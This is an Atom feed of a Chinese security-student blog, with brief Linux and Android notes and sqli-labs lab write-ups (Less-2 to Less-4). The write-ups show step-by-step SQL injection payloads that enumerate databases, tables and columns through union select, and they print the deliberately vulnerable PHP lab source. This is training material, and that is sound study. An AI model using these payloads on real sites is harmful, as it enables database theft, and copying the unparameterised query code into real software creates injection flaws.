<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://singlemindedt.github.io/"/>
  <updated>2020-02-28T05:06:58.773Z</updated>
  <id>https://singlemindedt.github.io/</id>
  
  <author>
    <name>Smtsec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>操作系统安全</title>
    <link href="https://singlemindedt.github.io/2020/02/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    <id>https://singlemindedt.github.io/2020/02/28/操作系统安全/</id>
    <published>2020-02-28T02:26:23.000Z</published>
    <updated>2020-02-28T05:06:58.773Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Linux操作系统</title>
    <link href="https://singlemindedt.github.io/2020/02/28/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <id>https://singlemindedt.github.io/2020/02/28/Linux操作系统/</id>
    <published>2020-02-28T01:29:23.000Z</published>
    <updated>2020-02-28T02:25:54.340Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四讲"><a href="#第四讲" class="headerlink" title="第四讲"></a>第四讲</h1><h2 id="用户组文件"><a href="#用户组文件" class="headerlink" title="用户组文件"></a>用户组文件</h2><h2 id="普通用户管理"><a href="#普通用户管理" class="headerlink" title="普通用户管理"></a>普通用户管理</h2><h2 id="1-添加用户命令-useradd"><a href="#1-添加用户命令-useradd" class="headerlink" title="1.添加用户命令:useradd"></a>1.添加用户命令:useradd</h2><p>2.更改用户口令命令：passwd</p><ul><li><input checked disabled type="checkbox"> 在创建Linux分区时,一定要创建两个分区:SWAP/ROOT</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第四讲&quot;&gt;&lt;a href=&quot;#第四讲&quot; class=&quot;headerlink&quot; title=&quot;第四讲&quot;&gt;&lt;/a&gt;第四讲&lt;/h1&gt;&lt;h2 id=&quot;用户组文件&quot;&gt;&lt;a href=&quot;#用户组文件&quot; class=&quot;headerlink&quot; title=&quot;用户组文件&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-4</title>
    <link href="https://singlemindedt.github.io/2020/02/26/sqli-labs-Page-1-Less-4/"/>
    <id>https://singlemindedt.github.io/2020/02/26/sqli-labs-Page-1-Less-4/</id>
    <published>2020-02-26T10:41:44.000Z</published>
    <updated>2020-02-27T01:14:49.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-4（GET方式-基于双引号-string型）"><a href="#Less-4（GET方式-基于双引号-string型）" class="headerlink" title="Less-4（GET方式-基于双引号-string型）"></a>Less-4（GET方式-基于双引号-string型）</h2><p><img src="https://s2.ax1x.com/2020/02/27/3d9L6K.png" alt="3d9L6K.png"><br>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><ul><li>尝试通过get方式输入ID和数值参数：<br><font color="#ff000" face="黑体" size="4">?id=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d9ql6.png" alt="3d9ql6.png"><br>成功得到查询结果；</p><hr><ul><li>添加单引号：<br><font color="#ff000" face="黑体" size="4">?id=1’</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d9OOO.png" alt="3d9OOO.png"><br>语句正常执行；</p><hr><ul><li>添加双引号：<br><font color="#ff000" face="黑体" size="4">?id=1“</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3dCPpt.png" alt="3dCPpt.png"><br>出现了报错信息，仔细观察信息，可以看到报错信息里出现了多个双引号和一个圆括号，猜测可能为(“”)闭合方式；</p><hr><ul><li>添加双引号+）：<br><font color="#ff000" face="黑体" size="4">?id=1“）</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3dCPpt.png" alt="3dCPpt.png"><br>  看到出现了报错结果，错误就在”）附近；</p><hr><ul><li>添加双引号+）–+：<br><font color="#ff000" face="黑体" size="4">?id=1“）–+</font></li></ul><p><a href="https://imgchr.com/i/3d9xTH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/27/3d9xTH.md.png" alt="3d9xTH.png" border="0"></a><br>成功查询到结果，基本可以确定为(“”)闭合方式；</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1“）and 1=2–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d9bSx.png" alt="3d9bSx.png"><br>可以看到既无报错信息也没有回显任何内容，说明我们所输入的语法是对的，在1=2上存在逻辑错误，即<code>SELECT * FROM users WHERE id=(“1”)and 1=2--+”) LIMIT 0,1</code>；</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1”）and 1=1–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d97f1.png" alt="3d97f1.png"><br>成功得到查询内容与<font color="#ff000" face="黑体" size="4">?id=1“）–+</font>结果一致，即语法和逻辑均正确，说明此处确为<strong>(“”)字符型注入</strong>；</p><hr><hr><p>==猜解数据库内容==<br>猜解过程与Page-1-Less-3基本相同，只是在原来的基础上将<strong>‘</strong>改为<strong>”</strong>，此处仅举一例；<br>例：利用显示位爆破数据库名：<br><font color="#ff0000" face="黑体" size="4">?id=-1”) union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</font> </p><p><img src="https://s2.ax1x.com/2020/02/27/3d9jmD.png" alt="3d9jmD.png"><br>成功得到查询结果；</p><hr><ul><li>查看源码：<br>可以看到查询语句的格式为：<br><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code>//将ID变量与“连接；构成新的ID；<br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></li></ul><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-4（GET方式-基于双引号-string型）&quot;&gt;&lt;a href=&quot;#Less-4（GET方式-基于双引号-string型）&quot; class=&quot;headerlink&quot; title=&quot;Less-4（GET方式-基于双引号-string型）&quot;&gt;&lt;/a&gt;Less-
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-3</title>
    <link href="https://singlemindedt.github.io/2020/02/25/sqli-labs-Page-1-Less-3/"/>
    <id>https://singlemindedt.github.io/2020/02/25/sqli-labs-Page-1-Less-3/</id>
    <published>2020-02-25T02:25:38.000Z</published>
    <updated>2020-02-27T01:15:51.677Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-3-（GET方式-基于单引号变形-string型）"><a href="#Less-3-（GET方式-基于单引号变形-string型）" class="headerlink" title="Less-3 （GET方式-基于单引号变形-string型）"></a>Less-3 （GET方式-基于单引号变形-string型）</h2><p><img src="https://s2.ax1x.com/2020/02/25/3YwyNj.png" alt="3YwyNj.png"><br>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><ul><li>尝试通过get方式输入ID和数值参数：<br><font color="#ff000" face="黑体" size="4">?id=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3YwRg0.png" alt="3YwRg0.png"><br>成功得到查询结果；</p><hr><ul><li>添加单引号：<br><font color="#ff000" face="黑体" size="4">?id=1’</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3Yw23q.png" alt="3Yw23q.png"><br>得到报错信息，即我们所输入的单引号与查询语句格式不匹配，从报错信息还可以看出可能与’）‘有关，猜测可能为单引号多余或者闭合格式为（’‘）造成；</p><hr><ul><li>加入注释符：<br><font color="#ff000" face="黑体" size="4">?id=1’–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3Yw64s.png" alt="3Yw64s.png"><br>可以看出还是回显报错信息，并且错误之处还是在单引号附近；</p><hr><ul><li>加单引号+）+注释符</li></ul><p><font color="#ff000" face="黑体" size="4">?id=1’）–+</font></p><p><img src="https://s2.ax1x.com/2020/02/25/3Y6wJe.png" alt="3Y6wJe.png"><br>看到成功得到查询内容，所以该处的闭合方式为<strong>(‘’)</strong>;</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1’）and 1=2–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3YREfU.png" alt="3YREfU.png"><br>可以看到既无报错信息也没有回显任何内容，说明我们所输入的语法是对的，在1=2上存在逻辑错误，即<code>SELECT * FROM users WHERE id=(&#39;1&#39;)and 1=2--+&#39;) LIMIT 0,1</code>；</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1’）and 1=1–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3YRel4.png" alt="3YRel4.png"><br>成功得到查询内容，说明此处确为<strong>(‘’)字符型注入；</strong></p><hr><hr><p>==猜解数据库内容==<br>猜解过程与Page-1-Less-1基本相同，只是在原来的基础上加一个“)”，此处仅举一例；<br>例：数据库版本，库名：<br><font color="#ff000" face="黑体" size="4">?id=-1’) union select 1,version(),database() –+</font></p><p><img src="https://s2.ax1x.com/2020/02/25/3YTkz6.png" alt="3YTkz6.png"><br>成功得到结果；</p><hr><ul><li>查看源码：<br>可以看到查询语句的格式为：<code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></li></ul><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-3-（GET方式-基于单引号变形-string型）&quot;&gt;&lt;a href=&quot;#Less-3-（GET方式-基于单引号变形-string型）&quot; class=&quot;headerlink&quot; title=&quot;Less-3 （GET方式-基于单引号变形-string型）&quot;&gt;
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-2</title>
    <link href="https://singlemindedt.github.io/2020/02/20/sqli-labs-Page-1-Less-2/"/>
    <id>https://singlemindedt.github.io/2020/02/20/sqli-labs-Page-1-Less-2/</id>
    <published>2020-02-20T08:45:57.000Z</published>
    <updated>2020-02-27T15:02:18.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-2（GET方式-基于整型）"><a href="#Less-2（GET方式-基于整型）" class="headerlink" title="Less-2（GET方式-基于整型）"></a>Less-2（GET方式-基于整型）</h2><p><img src="https://s2.ax1x.com/2020/02/24/38Rpgs.png" alt="38Rpgs.png"></p><p>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><ul><li>尝试通过get方式输入ID和数值参数：<br><font color="#ff000" face="黑体" size="4">?id=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/24/3GmO10.png" alt="3GmO10.png"><br>可以看到给出了相应的login name 和password;</p><ul><li>再添加一个单引号看看：<br><font color="#ff000" face="黑体" size="4">?id=1’</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/24/3GmXcV.png" alt="3GmXcV.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">错误信息：</span><br><span class="line"> You have an error in your SQL syntax; <span class="keyword">check</span> the <span class="keyword">manual</span> that corresponds <span class="keyword">to</span> your MySQL <span class="keyword">server</span> <span class="keyword">version</span> <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> <span class="keyword">use</span> near <span class="string">''</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">' at line 1</span></span><br></pre></td></tr></table></figure><p>这时sql语句出错，程序无法正常从数据库中查询出数据，抛出异常；</p><ul><li>添加and 1=1；<br><font color="#ff000" face="黑体" size="4">?id=1 and 1=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/24/3Gmbhn.png" alt="3Gmbhn.png"></p><p>可看到命令执行正常，返回了查询结果；</p><ul><li>加单引号+and 1=1<br><font color="#ff000" face="黑体" size="4">?id=1’ and 1=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/24/3GmjXT.png" alt="3GmjXT.png"></p><p>可以看到语句报错，抛出异常；</p><ul><li>添加and 1=2<br><font color="#ff000" face="黑体" size="4">?id=1 and 1=2</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/24/3GmLpq.png" alt="3GmLpq.png"><br>可以看到语句正常执行，但是无返回结果，即从此处就可以看出，语句正确，但是逻辑错误，所以返回错误，所以此处为整型注入。</p><hr><p>==接下来按流程猜解数据库内容：==<br>*由于该数据库并没有其他限制语句，故此例省略注释符– *<br>1.猜解数据库表列数<br><font color="#ff000" face="黑体" size="4">?id=1 order by 3</font></p><p><img src="https://s2.ax1x.com/2020/02/24/3GNblD.png" alt="3GNblD.png"><br>order by 3页面回显正常;<br>[25]:()<br><img src="https://s2.ax1x.com/2020/02/24/3GNHSO.png" alt="3GNHSO.png"><br>order by 4页面回显报错,故该表共有3列；</p><hr><p>2.判断数据显示位<br><font color="#ff000" face="黑体" size="4">?id=-1 union select 1,2,3</font><br>[26]:()<br><img src="https://s2.ax1x.com/2020/02/24/3GUxu4.png" alt="3GUxu4.png"><br>得到有2，3两个显示位；</p><hr><p>3.利用显示位爆破数据库版本及数据库名<br><font color="#ff000" face="黑体" size="4">?id=-1 union select 1,version(),database()</font><br>[27]:()<br><img src="https://s2.ax1x.com/2020/02/24/3GgsbV.png" alt="3GgsbV.png"><br>爆出，version：5.5.53，database：security；</p><p>查询所有数据库名：</p><p><font color="#ff000" face="黑体" size="4">?id=-1 union select 1,(select group_concat(schema_name)from information_schema.schemata),3–+</font><br>[28]:()<br><img src="https://s2.ax1x.com/2020/02/24/3GgcUU.png" alt="3GgcUU.png"><br>得到8个数据库，分别为：information_schema,challenges,dvwa,easysql,mysql,performance_schema,security,test;</p><hr><p>4.利用显示位爆破表名，此处我们查mysql数据库中的表名<br><font color="#ff000" face="黑体" size="4">?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’mysql’),3–+</font><br>[29]:()<br><img src="https://s2.ax1x.com/2020/02/24/3Gg6ET.png" alt="3Gg6ET.png"><br>得到很多表，此处不一一列举；</p><hr><p>5.利用显示位爆破列名，此处我们查询db表里的列<br><font color="#ff000" face="黑体" size="4">?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’db’),3–+</font><br>[30]:()<br><img src="https://s2.ax1x.com/2020/02/24/3Ggg5F.png" alt="3Ggg5F.png"><br>得到很多列，此处不一一列举；</p><hr><p>6.利用显示位爆破字段，此处我们查询db表中Host和User</p><p><font color="#ff0000" face="黑体" size="4">?id=-1 union select 1,(select group_concat(Host) from mysql.db),(select group_concat(User) from mysql.db)–+</font></p><p><img src="https://s2.ax1x.com/2020/02/24/3GgrD0.png" alt="3GgrD0.png"><br>得到Host内容%，%；User：，；<br>查看源码：<br>查询语句为：<code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code>，确为整型注入；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-2（GET方式-基于整型）&quot;&gt;&lt;a href=&quot;#Less-2（GET方式-基于整型）&quot; class=&quot;headerlink&quot; title=&quot;Less-2（GET方式-基于整型）&quot;&gt;&lt;/a&gt;Less-2（GET方式-基于整型）&lt;/h2&gt;&lt;p&gt;&lt;img s
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>移动应用开发</title>
    <link href="https://singlemindedt.github.io/2020/02/20/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"/>
    <id>https://singlemindedt.github.io/2020/02/20/移动应用开发/</id>
    <published>2020-02-20T06:53:26.000Z</published>
    <updated>2020-02-27T14:43:06.704Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h1 id="打包APK"><a href="#打包APK" class="headerlink" title="打包APK"></a>打包APK</h1><h1 id="基本控件"><a href="#基本控件" class="headerlink" title="基本控件"></a>基本控件</h1><h3 id="字符串统一修改"><a href="#字符串统一修改" class="headerlink" title="字符串统一修改"></a>字符串统一修改</h3><p>res-&gt;values-&gt;strings.xml统一修改，防止之后修改任务量巨大的问题（其他文件字符串部分通过调用strings.xml文件内容实现，如： android:label=”@string/app_name”）<br>+++++<br>==Android中的三个重要文件==</p><h2 id="1-Activity"><a href="#1-Activity" class="headerlink" title="1.Activity"></a>1.Activity</h2><p>是一个类；</p><h2 id="2-Layout文件"><a href="#2-Layout文件" class="headerlink" title="2.Layout文件"></a>2.Layout文件</h2><p>xml文件；</p><h2 id="3-Manifest"><a href="#3-Manifest" class="headerlink" title="3.Manifest"></a>3.Manifest</h2><p><intent-filter>配置文件<br>+++++<br>==Andeoid中的View组件==<br>1.TextView<br>2.Button<br>3.Edittext<br>4.图片视图组件ImageView<br>5.单选按钮组件RadioGroup<br>6.复选框组件CheckBox</intent-filter></p><h2 id="4-界面布局"><a href="#4-界面布局" class="headerlink" title="4.界面布局"></a>4.界面布局</h2><p>（布局管理器）</p><ul><li><p>1.线性布局管理器LinearLayout</p><p>:smile:</p><p><strong>Weight用法 ：0dp、WrapContent、match_parent</strong></p></li><li><p>2.相对布局管理器RelativeLayout*</p><p>:smile:</p></li><li><p>3.框架布局管理器FrameLayout</p></li><li><p>4.表格布局管理器TableLayout</p></li><li><p>5.网格布局管理器GridLayout<br>（ConstraintLayout管理器）</p><h1 id="第4章-Activity"><a href="#第4章-Activity" class="headerlink" title="第4章 Activity"></a>第4章 Activity</h1></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;h1 id=&quot;打包APK&quot;&gt;&lt;a href=&quot;#打包APK&quot; class=&quot;headerlink&quot; title=&quot;打包APK&quot;&gt;&lt;/a&gt;打包AP
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-1</title>
    <link href="https://singlemindedt.github.io/2020/02/19/sqli-labs-Page-1-Less-1/"/>
    <id>https://singlemindedt.github.io/2020/02/19/sqli-labs-Page-1-Less-1/</id>
    <published>2020-02-19T08:45:57.000Z</published>
    <updated>2020-02-27T01:18:20.472Z</updated>
    
